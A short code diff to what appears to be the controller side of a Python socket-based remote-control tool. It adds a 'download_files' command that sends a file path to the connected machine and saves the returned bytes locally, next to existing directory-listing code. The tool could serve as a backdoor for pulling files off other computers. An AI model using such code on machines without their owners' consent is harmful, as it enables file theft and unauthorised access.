@@ -42,6 +42,22 @@ while 1:
         files = files.decode()
         print("The files inside the directory ", directory, " are given as follows: ")
         print(files)
+    
+    elif command == "download_files":
+        conn.send(command.encode())
+        print("Command download_files has been executed successfully!")
+
+        filepath = input(str("Please input the file path including the file name: "))
+        conn.send(filepath.encode())
+        print("File path sent!")
+
+        files = conn.recv(1000000)
+        filename = input(str("Please enter a filename for the incoming file: "))
+        new_file = open(filename, "wb")
+        new_file.write(files)
+        new_file.close()
+
+        print("File downloaded successfully!")
 
     else:
         print("Command NOT recognized!")
